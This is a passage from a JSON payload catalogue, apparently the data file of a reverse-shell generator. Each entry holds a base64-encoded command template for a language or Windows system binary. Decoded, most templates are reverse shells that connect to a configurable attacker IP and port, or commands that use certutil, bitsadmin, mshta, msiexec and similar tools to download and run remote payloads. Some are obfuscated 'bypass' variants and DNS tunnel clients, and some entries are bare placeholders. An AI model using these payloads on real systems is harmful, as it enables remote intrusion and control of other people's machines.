    "template": "UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY21kLmV4ZSAvYyBzdGFydCAvQiBuYyB7aXB9IHtwb3J0fSAtZSBjbWQuZXhlIik7",
    "description": "Java calling NC on Windows."
  },
  {
    "id": "groovy-string-60",
    "name": "Groovy String",
    "os": "linux",
    "language": "java",
    "tags": [
      "jenkins"
    ],
    "template": "ImJhc2ggLWkgPiYgL2Rldi90Y3Ave2lwfS97cG9ydH0gMD4mMSIuZXhlY3V0ZSgp",
    "description": "Groovy simple execute."
  },
  {
    "id": "scala-61",
    "name": "Scala",
    "os": "linux",
    "language": "scala",
    "tags": [
      "jvm"
    ],
    "template": "aW1wb3J0IGphdmEuaW8uXzsgaW1wb3J0IGphdmEubmV0Ll87IGltcG9ydCBzY2FsYS5zeXMucHJvY2Vzcy5fOyB2YWwgcCA9IG5ldyBQcm9jZXNzQnVpbGRlcigiL2Jpbi9zaCIpLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkuc3RhcnQoKTsgLi4u",
    "description": "Scala reverse shell."
  },
  {
    "id": "kotlin-62",
    "name": "Kotlin",
    "os": "linux",
    "language": "kotlin",
    "tags": [
      "jvm"
    ],
    "template": "aW1wb3J0IGphdmEuaW8uKjsgaW1wb3J0IGphdmEubmV0Lio7IHZhbCBwID0gUHJvY2Vzc0J1aWxkZXIoIi9iaW4vc2giKS5yZWRpcmVjdEVycm9yU3RyZWFtKHRydWUpLnN0YXJ0KCk7IC4uLg==",
    "description": "Kotlin reverse shell."
  },
  {
    "id": "ruby-socket-63",
    "name": "Ruby Socket",
    "os": "linux",
    "language": "ruby",
    "tags": [
      "standard"
    ],
    "template": "cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7aXB9Iix7cG9ydH0pLnRvX2k7ZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIDwmJWQgPiYlZCAyPiYlZCIsZixmLGYpJw==",
    "description": "Ruby Socket."
  },
  {
    "id": "ruby-no-sh-64",
    "name": "Ruby No Sh",
    "os": "linux",
    "language": "ruby",
    "tags": [
      "bypass"
    ],
    "template": "cnVieSAtcnNvY2tldCAtZSdjPVRDUFNvY2tldC5uZXcoIntpcH0iLHtwb3J0fSk7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQn",
    "description": "Ruby No Sh."
  },
  {
    "id": "ruby-windows-65",
    "name": "Ruby Windows",
    "os": "windows",
    "language": "ruby",
    "tags": [
      "windows"
    ],
    "template": "cnVieSAtcnNvY2tldCAtZSdjPVRDUFNvY2tldC5uZXcoIntpcH0iLHtwb3J0fSk7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQn",
    "description": "Ruby Windows."
  },
  {
    "id": "ruby-exec-66",
    "name": "Ruby Exec",
    "os": "linux",
    "language": "ruby",
    "tags": [
      "standard"
    ],
    "template": "cnVieSAtZSAnZXhlYyAiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiJw==",
    "description": "Ruby Exec."
  },
  {
    "id": "ruby-system-67",
    "name": "Ruby System",
    "os": "linux",
    "language": "ruby",
    "tags": [
      "standard"
    ],
    "template": "cnVieSAtZSAnc3lzdGVtICIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIn",
    "description": "Ruby System."
  },
  {
    "id": "ruby-io-loop-68",
    "name": "Ruby IO Loop",
    "os": "linux",
    "language": "ruby",
    "tags": [
      "modern"
    ],
    "template": "cnVieSAtciBzb2NrZXQgLWUgJ3M9VENQU29ja2V0Lm5ldygie2lwfSIse3BvcnR9KTtsb29wIGRvO2NtZD1zLmdldHMuY2hvbXA7cy5wdXRzIElPLnBvcGVuKGNtZCkucmVhZDtlbmQn",
    "description": "Ruby IO Loop."
  },
  {
    "id": "ruby-open3-69",
    "name": "Ruby Open3",
    "os": "linux",
    "language": "ruby",
    "tags": [
      "modern"
    ],
    "template": "cnVieSAtciBvcGVuMyAtciBzb2NrZXQgLWUgJ3M9VENQU29ja2V0Lm5ldygie2lwfSIse3BvcnR9KTtPcGVuMy5wb3BlbjMoIi9iaW4vc2ggLWkiKXt8aSxvLGUsdHxpLnJlb3BlbihzKTtvLnJlb3BlbihzKTtlLnJlb3BlbihzKTt0LnZhbHVlfSc=",
    "description": "Ruby Open3."
  },
  {
    "id": "perl-socket-70",
    "name": "Perl Socket",
    "os": "linux",
    "language": "perl",
    "tags": [
      "standard"
    ],
    "template": "cGVybCAtZSAndXNlIFNvY2tldDskaT0ie2lwfSI7JHA9e3BvcnR9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=",
    "description": "Perl Socket."
  },
  {
    "id": "perl-no-sh-71",
    "name": "Perl No Sh",
    "os": "linux",
    "language": "perl",
    "tags": [
      "bypass"
    ],
    "template": "cGVybCAtTUlPOjpTb2NrZXQgLWUgJyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7aXB9Ontwb3J0fSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc=",
    "description": "Perl No Sh."
  },
  {
    "id": "perl-windows-72",
    "name": "Perl Windows",
    "os": "windows",
    "language": "perl",
    "tags": [
      "windows"
    ],
    "template": "cGVybCAtTUlPOjpTb2NrZXQgLWUgJyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7aXB9Ontwb3J0fSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc=",
    "description": "Perl Windows."
  },
  {
    "id": "perl-backticks-73",
    "name": "Perl Backticks",
    "os": "linux",
    "language": "perl",
    "tags": [
      "short"
    ],
    "template": "cGVybCAtZSAnYC9iaW4vc2ggLWkgPCYzID4mMyAyPiYzYCc=",
    "description": "Perl Backticks."
  },
  {
    "id": "perl-io-74",
    "name": "Perl IO",
    "os": "linux",
    "language": "perl",
    "tags": [
      "modern"
    ],
    "template": "cGVybCAtZSAndXNlIElPOjpTb2NrZXQ6OklORVQ7JHM9SU86OlNvY2tldDo6SU5FVC0+bmV3KCJ7aXB9Ontwb3J0fSIpOyRzLT5zZW5kKCJQUz4gIik7d2hpbGUoPCRzPil7JHMtPnNlbmQocXgoJF8pKX0n",
    "description": "Perl IO Loop."
  },
  {
    "id": "perl-pipeline-75",
    "name": "Perl Pipeline",
    "os": "linux",
    "language": "perl",
    "tags": [
      "bypass"
    ],
    "template": "cGVybCAtZSAndXNlIFNvY2tldDskaT0ie2lwfSI7JHA9e3BvcnR9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=",
    "description": "Perl Pipeline."
  },
  {
    "id": "perl-mknod-76",
    "name": "Perl Mknod",
    "os": "linux",
    "language": "perl",
    "tags": [
      "legacy"
    ],
    "template": "cGVybCAtZSAnc3lzdGVtKCJta25vZCAvdG1wL2JhY2twaXBlIHAgJiYgL2Jpbi9zaCAwPC90bXAvYmFja3BpcGUgfCBuYyB7aXB9IHtwb3J0fSAxPi90bXAvYmFja3BpcGUiKTsn",
    "description": "Perl Mknod."
  },
  {
    "id": "golang-exec-77",
    "name": "Golang Exec",
    "os": "linux",
    "language": "go",
    "tags": [
      "compiled"
    ],
    "template": "ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7aXB9Ontwb3J0fSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9JyA+IC90bXAvdC5nbyAmJiBnbyBydW4gL3RtcC90LmdvICYmIHJtIC90bXAvdC5nbw==",
    "description": "Golang on-the-fly."
  },
  {
    "id": "golang-source-78",
    "name": "Golang Source",
    "os": "linux",
    "language": "go",
    "tags": [
      "source"
    ],
    "template": "cGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7aXB9Ontwb3J0fSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9",
    "description": "Golang Source Code."
  },
  {
    "id": "golang-windows-79",
    "name": "Golang Windows",
    "os": "windows",
    "language": "go",
    "tags": [
      "windows"
    ],
    "template": "cGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7aXB9Ontwb3J0fSIpO2NtZDo9ZXhlYy5Db21tYW5kKCJjbWQuZXhlIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9",
    "description": "Golang Windows Source."
  },
  {
    "id": "golang-c2-80",
    "name": "Golang C2",
    "os": "linux",
    "language": "go",
    "tags": [
      "c2"
    ],
    "template": "Ly8gQzIgaW1wbGVtZW50YXRpb24gcGxhY2Vob2xkZXI=",
    "description": "Golang C2 Agent."
  },
  {
    "id": "golang-bind-81",
    "name": "Golang Bind",
    "os": "linux",
    "language": "go",
    "tags": [
      "bind"
    ],
    "template": "Ly8gQmluZCBzaGVsbCBpbXBsZW1lbnRhdGlvbg==",
    "description": "Golang Bind Shell."
  },
  {
    "id": "rust-tcp-82",
    "name": "Rust TCP",
    "os": "linux",
    "language": "rust",
    "tags": [
      "compiled"
    ],
    "template": "dXNlIHN0ZDo6bmV0OjpUY3BTdHJlYW07dXNlIHN0ZDo6b3M6OnVuaXg6OmlvOjp7QXNSYXdGZCwgRnJvbVJhd0ZkfTt1c2Ugc3RkOjpwcm9jZXNzOjpDb21tYW5kO2Z1bmMgbWFpbigpIHtsZXQgcyA9IFRjcFN0cmVhbTo6Y29ubmVjdCgie2lwfTp7cG9ydH0iKS51bndyYXAoKTtsZXQgZmQgPSBzLmFzX3Jhd19mZCgpO0NvbW1hbmQ6Om5ldygiL2Jpbi9zaCIpLmFyZygiLWkiKS5zdGRpbih1bnNhZmUgeyBzdGQ6OnByb2Nlc3M6OlN0ZGlvOjpmcm9tX3Jhd19mZChmZCkgfSkuc3Rkb3V0KHVuc2FmZSB7IHN0ZDo6cHJvY2Vzczo6U3RkaW86OmZyb21fcmF3X2ZkKGZkKSB9KS5zdGRlcnIodW5zYWZlIHsgc3RkOjpwcm9jZXNzOjpTdGRpbzo6ZnJvbV9yYXdfZmQoZmQpIH0pLnNwYXduKCkudW53cmFwKCkud2FpdCgpLnVud3JhcCgpO30=",
    "description": "Rust TCP."
  },
  {
    "id": "rust-windows-83",
    "name": "Rust Windows",
    "os": "windows",
    "language": "rust",
    "tags": [
      "windows"
    ],
    "template": "Ly8gUnVzdCBXaW5kb3dzIGltcGxlbWVudGF0aW9u",
    "description": "Rust Windows."
  },
  {
    "id": "rust-source-84",
    "name": "Rust Source",
    "os": "linux",
    "language": "rust",
    "tags": [
      "source"
    ],
    "template": "Ly8gUnVzdCBTb3VyY2UgQ29kZQ==",
    "description": "Rust Source Code."
  },
  {
    "id": "c-socket-85",
    "name": "C Socket",
    "os": "linux",
    "language": "c",
    "tags": [
      "compiled"
    ],
    "template": "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+Ci4uLg==",
    "description": "C Socket Source."
  },
  {
    "id": "c-windows-86",
    "name": "C Windows",
    "os": "windows",
    "language": "c",
    "tags": [
      "windows"
    ],
    "template": "I2luY2x1ZGUgPHdpbnNvY2syLmg+Ci4uLg==",
    "description": "C Windows Source."
  },
  {
    "id": "c-tcp-87",
    "name": "C# TCP",
    "os": "windows",
    "language": "csharp",
    "tags": [
      "compiled"
    ],
    "template": "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5UZXh0O3VzaW5nIFN5c3RlbS5JTzt1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7dXNpbmcgU3lzdGVtLkNvbXBvbmVudE1vZGVsO3VzaW5nIFN5c3RlbS5MaW5xO3VzaW5nIFN5c3RlbS5OZXQ7dXNpbmcgU3lzdGVtLk5ldC5Tb2NrZXRzOy4uLg==",
    "description": "C# TCP Client."
  },
  {
    "id": "c-process-88",
    "name": "C# Process",
    "os": "windows",
    "language": "csharp",
    "tags": [
      "compiled"
    ],
    "template": "Ly8gQyMgUHJvY2VzcyBTdGFydA==",
    "description": "C# Process Start."
  },
  {
    "id": "gcc-compile-89",
    "name": "GCC Compile",
    "os": "linux",
    "language": "c",
    "tags": [
      "compiled"
    ],
    "template": "Z2NjIC1vIC90bXAvcyAvdG1wL3MuYyAmJiAvdG1wL3M=",
    "description": "GCC Compile Command."
  },
  {
    "id": "nodejs-exec-90",
    "name": "NodeJS Exec",
    "os": "linux",
    "language": "nodejs",
    "tags": [
      "web"
    ],
    "template": "KHZvaWQpKChmdW5jdGlvbigpe3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3Qoe3BvcnR9LCJ7aXB9IixmdW5jdGlvbigpe2NsaWVudC5waXBlKHNoLnN0ZGluKTtzaC5zdGRvdXQucGlwZShjbGllbnQpO3NoLnN0ZGVyci5waXBlKGNsaWVudCk7fSk7cmV0dXJuIC9hLzt9KSgpKTs=",
    "description": "NodeJS Exec."
  },
  {
    "id": "nodejs-iife-91",
    "name": "NodeJS IIFE",
    "os": "linux",
    "language": "nodejs",
    "tags": [
      "web"
    ],
    "template": "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ25jIC1lIC9iaW4vc2gge2lwfSB7cG9ydH0nKQ==",
    "description": "NodeJS IIFE."
  },
  {
    "id": "nodejs-net-92",
    "name": "NodeJS Net",
    "os": "linux",
    "language": "nodejs",
    "tags": [
      "web"
    ],
    "template": "dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpOyB2YXIgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIik7IHZhciBzaCA9IGNwLnNwYXduKCIvYmluL3NoIiwgW10pOyAuLi4=",
    "description": "NodeJS Net."
  },
  {
    "id": "lua-socket-93",
    "name": "Lua Socket",
    "os": "linux",
    "language": "lua",
    "tags": [
      "embedded"
    ],
    "template": "bHVhIC1lICJsb2NhbCBzPXJlcXVpcmUoJ3NvY2tldCcpO2xvY2FsIHQ9YXNzZXJ0KHMuY29ubmVjdCgne2lwfScse3BvcnR9KSk7dDpzZW5kKCdzaGVsbD4gJyk7d2hpbGUgdHJ1ZSBkbyBsb2NhbCBsLGU9dDpyZWNlaXZlKCk7aWYgbm90IGwgdGhlbiBicmVhayBlbmQ7bG9jYWwgZixlPWlvLnBvcGVuKGwsJ3InKTtsb2NhbCByPWY6cmVhZCgnKmEnKTt0OnNlbmQocik7dDpzZW5kKCdzaGVsbD4gJyk7ZW5kO3Q6Y2xvc2UoKSI=",
    "description": "Lua Socket."
  },
  {
    "id": "lua-os-execute-94",
    "name": "Lua OS Execute",
    "os": "linux",
    "language": "lua",
    "tags": [
      "embedded"
    ],
    "template": "bHVhIC1lICJvcy5leGVjdXRlKCdybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyB7aXB9IHtwb3J0fSA+L3RtcC9mJyki",
    "description": "Lua OS Execute."
  },
  {
    "id": "lua-5-1-95",
    "name": "Lua 5.1",
    "os": "linux",
    "language": "lua",
    "tags": [
      "legacy"
    ],
    "template": "bHVhNS4xIC1lICcuLi4n",
    "description": "Lua 5.1."
  },
  {
    "id": "awk-tcp-96",
    "name": "AWK TCP",
    "os": "linux",
    "language": "awk",
    "tags": [
      "bypass"
    ],
    "template": "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC97aXB9L3twb3J0fSI7IHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKSB9fSc=",
    "description": "AWK TCP."
  },
  {
    "id": "tclsh-97",
    "name": "Tclsh",
    "os": "linux",
    "language": "tcl",
    "tags": [
      "legacy"
    ],
    "template": "ZWNobyAnc2V0IHMgW3NvY2tldCB7aXB9IHtwb3J0fV07d2hpbGUgNDIgeyBwdXRzIC1ub25ld2xpbmUgJHMgInNoZWxsPiI7Zmx1c2ggJHM7Z2V0cyAkcyBjO3NldCBlICJleGVjICRjIjtpZiB7IVtjYXRjaCB7c2V0IHIgW2V2YWwgJGVdfSBlcnJdfSB7IHB1dHMgJHMgJHIgfTsgZmx1c2ggJHM7IH07IGNsb3NlICRzOycgfCB0Y2xzaA==",
    "description": "Tclsh."
  },
  {
    "id": "zsh-tcp-98",
    "name": "Zsh TCP",
    "os": "linux",
    "language": "zsh",
    "tags": [
      "modern"
    ],
    "template": "enNoIC1jICd6bW9kbG9hZCB6c2gvbmV0L3RjcCAmJiB6dGNwIHtpcH0ge3BvcnR9ICYmIHpzaCA+JiRSRVBMWSAyPiYkUkVQTFkgMD4mJFJFUExZJw==",
    "description": "Zsh TCP."
  },
  {
    "id": "fish-99",
    "name": "Fish",
    "os": "linux",
    "language": "fish",
    "tags": [
      "modern"
    ],
    "template": "ZmlzaCAtYyAnLi4uJw==",
    "description": "Fish shell."
  },
  {
    "id": "dart-100",
    "name": "Dart",
    "os": "linux",
    "language": "dart",
    "tags": [
      "compiled"
    ],
    "template": "aW1wb3J0ICdpbzpkYXJ0JzsgLi4u",
    "description": "Dart."
  },
  {
    "id": "swift-101",
    "name": "Swift",
    "os": "mac",
    "language": "swift",
    "tags": [
      "compiled"
    ],
    "template": "aW1wb3J0IEZvdW5kYXRpb247IC4uLg==",
    "description": "Swift."
  },
  {
    "id": "r-102",
    "name": "R",
    "os": "linux",
    "language": "r",
    "tags": [
      "data"
    ],
    "template": "c3lzdGVtKCJuYyAtZSAvYmluL3NoIHtpcH0ge3BvcnR9Iik=",
    "description": "R system."
  },
  {
    "id": "elixir-103",
    "name": "Elixir",
    "os": "linux",
    "language": "elixir",
    "tags": [
      "functional"
    ],
    "template": "Li4u",
    "description": "Elixir."
  },
  {
    "id": "erlang-104",
    "name": "Erlang",
    "os": "linux",
    "language": "erlang",
    "tags": [
      "functional"
    ],
    "template": "Li4u",
    "description": "Erlang."
  },
  {
    "id": "haskell-105",
    "name": "Haskell",
    "os": "linux",
    "language": "haskell",
    "tags": [
      "functional"
    ],
    "template": "Li4u",
    "description": "Haskell."
  },
  {
    "id": "certutil-106",
    "name": "Certutil",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "Y2VydHV0aWwgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8ve2lwfTp7c2VydmVyX3BvcnR9L25jLmV4ZSBuYy5leGUgJiBuYy5leGUge2lwfSB7cG9ydH0gLWUgY21kLmV4ZQ==",
    "description": "Certutil download."
  },
  {
    "id": "bitsadmin-107",
    "name": "Bitsadmin",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "Yml0c2FkbWluIC90cmFuc2ZlciBteUpvYiBodHRwOi8ve2lwfTp7c2VydmVyX3BvcnR9L25jLmV4ZSAlQVBQREFUQSVcbmMuZXhlICYgJUFQUERBVEElXG5jLmV4ZSB7aXB9IHtwb3J0fSAtZSBjbWQuZXhl",
    "description": "Bitsadmin download."
  },
  {
    "id": "regsvr32-108",
    "name": "Regsvr32",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovL3tpcH06e3NlcnZlcl9wb3J0fS9wYXlsb2FkLnNjdCBzY3JvYmouZGxs",
    "description": "Regsvr32 SCT."
  },
  {
    "id": "mshta-109",
    "name": "Mshta",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "bXNodGEgaHR0cDovL3tpcH06e3NlcnZlcl9wb3J0fS9wYXlsb2FkLmh0YQ==",
    "description": "Mshta HTA."
  },
  {
    "id": "pcalua-110",
    "name": "Pcalua",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "cGNhbHVhIC1hIGh0dHA6Ly97aXB9OntzZXJ2ZXJfcG9ydH0vcGF5bG9hZC5leGU=",
    "description": "Pcalua execution."
  },
  {
    "id": "forfiles-111",
    "name": "Forfiles",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "Zm9yZmlsZXMgL3AgYzpcd2luZG93c1xzeXN0ZW0zMiAvbSBub3RlcGFkLmV4ZSAvYyAiY21kIC9jIG5jIHtpcH0ge3BvcnR9IC1lIGNtZCI=",
    "description": "Forfiles execution."
  },
  {
    "id": "rundll32-112",
    "name": "Rundll32",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "cnVuZGxsMzIuZXhlIGphdmFzY3JpcHQ6IlwuLlxtc2h0bWwsUnVuSFRNTEFwcGxpY2F0aW9uICI7ZG9jdW1lbnQud3JpdGUoKTtuZXclMjBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuKCJuYyB7aXB9IHtwb3J0fSAtZSBjbWQiKTs=",
    "description": "Rundll32 JS."
  },
  {
    "id": "wmic-113",
    "name": "Wmic",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "d21pYyBwcm9jZXNzIGNhbGwgY3JlYXRlICJuYyB7aXB9IHtwb3J0fSAtZSBjbWQi",
    "description": "Wmic process create."
  },
  {
    "id": "msiexec-114",
    "name": "Msiexec",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "bXNpZXhlYyAvcSAvaSBodHRwOi8ve2lwfTp7c2VydmVyX3BvcnR9L3BheWxvYWQubXNp",
    "description": "Msiexec MSI."
  },
  {
    "id": "bash-wsl--115",
    "name": "Bash (WSL)",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "wsl"
    ],
    "template": "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYxIg==",
    "description": "WSL Bash."
  },
  {
    "id": "dnscat2-116",
    "name": "Dnscat2",
    "os": "linux",
    "language": "bash",
    "tags": [
      "dns",
      "tunnel"
    ],
    "template": "ZG5zY2F0MiB7aXB9",
    "description": "Dnscat2 client."
  },
  {
    "id": "iodine-117",
    "name": "Iodine",
    "os": "linux",
    "language": "bash",
    "tags": [
      "dns",
      "tunnel"
    ],
    "template": "aW9kaW5lIC1mIC1QIHBhc3N3b3JkIHtpcH0gZG9tYWluLmNvbQ==",
    "description": "Iodine client."
  },
  {
    "id": "tunshell-118",
    "name": "Tunshell",
    "os": "linux",
    "language": "bash",
    "tags": [
      "dns",
      "tunnel"
    ],
    "template": "c2ggLWMgIiQoY3VybCAtc1NmIGh0dHBzOi8vdHVuc2hlbGwuY29tL2NsaWVudC5zaCkiIC1zIHtpcH0ge3BvcnR9",
    "description": "Tunshell client."
  },
  {
    "id": "hh-exe-119",
    "name": "Hh.exe",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "aGguZXhlIGh0dHA6Ly97aXB9OntzZXJ2ZXJfcG9ydH0vcGF5bG9hZC5jaG0=",
    "description": "HTML Help executable."
  },
  {
    "id": "odbcconf-120",
    "name": "Odbcconf",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "b2RiY2NvbmYgL3MgL2Ege3JlZ3N2ciBodHRwOi8ve2lwfTp7c2VydmVyX3BvcnR9L3BheWxvYWQuZGxsfQ==",
    "description": "Odbcconf execution."
  },
  {
    "id": "finger-121",
    "name": "Finger",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "ZmluZ2VyIHhAaHR0cDovL3tpcH06e3NlcnZlcl9wb3J0fS9wYXlsb2FkLmV4ZSB8IGNtZA==",
    "description": "Finger command."
  },
  {
    "id": "certreq-122",
    "name": "Certreq",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "Y2VydHJlcSAtUG9zdCAtY29uZmlnIGh0dHA6Ly97aXB9OntzZXJ2ZXJfcG9ydH0vYy5qc29uIGM6XHdpbmRvd3Ncd2luLmluaSBvdXRwdXQudHh0",
    "description": "Certreq upload/download."
  },
  {
    "id": "cmstp-123",
    "name": "Cmstp",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "Y21zdHAgL3MgL25pIC91IGh0dHA6Ly97aXB9OntzZXJ2ZXJfcG9ydH0vcGF5bG9hZC5zY3Q=",
    "description": "Cmstp execution."
  },
  {
    "id": "installutil-124",
    "name": "InstallUtil",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XEluc3RhbGxVdGlsLmV4ZSAvbG9nZmlsZT0gL0xvZ1RvQ29uc29sZT1mYWxzZSAvVSBodHRwOi8ve2lwfTp7c2VydmVyX3BvcnR9L3BheWxvYWQuZXhl",
    "description": "InstallUtil execution."
  },
  {
    "id": "regasm-125",
    "name": "Regasm",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XHJlZ2FzbS5leGUgL1UgaHR0cDovL3tpcH06e3NlcnZlcl9wb3J0fS9wYXlsb2FkLmRsbA==",
    "description": "Regasm execution."
  },
  {
    "id": "regsvcs-126",
    "name": "Regsvcs",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XHJlZ3N2Y3MuZXhlIC9VIGh0dHA6Ly97aXB9OntzZXJ2ZXJfcG9ydH0vcGF5bG9hZC5kbGw=",
    "description": "Regsvcs execution."
  },
  {
    "id": "msbuild-127",
    "name": "Msbuild",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XE1TQnVpbGQuZXhlIGh0dHA6Ly97aXB9OntzZXJ2ZXJfcG9ydH0vcGF5bG9hZC54bWw=",
    "description": "Msbuild execution."
  },
  {
    "id": "presentationhost-128",
    "name": "PresentationHost",
    "os": "windows",
    "language": "cmd",
    "tags": [
      "lolbin"
    ],
    "template": "UHJlc2VudGF0aW9uSG9zdC5leGUgLWRlYnVn",
    "description": "PresentationHost execution."
  },
  {
    "id": "bash-obfuscated-1-129",
    "name": "Bash Obfuscated 1",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass",
      "obfuscated"
    ],
    "template": "KGI9YmFzaDtlPWVjaG87JGIgLWMgIiRiIC1pID4mIC9kZXYvdGNwL3tpcH0ve3BvcnR9IDA+JjEiKQ==",
    "description": "Obfuscated Bash 1."
  },
  {
    "id": "bash-obfuscated-2-130",
    "name": "Bash Obfuscated 2",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass",
      "obfuscated"
    ],
    "template": "dz0iYmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYxIjsgZWNobyAkdyB8IGJhc2U2NCAtZCB8IGJhc2g=",
    "description": "Base64 pipe."
  },
  {
    "id": "python-polyglot-131",
    "name": "Python Polyglot",
    "os": "linux",
    "language": "python",
    "tags": [
      "bypass",
      "polyglot"
    ],
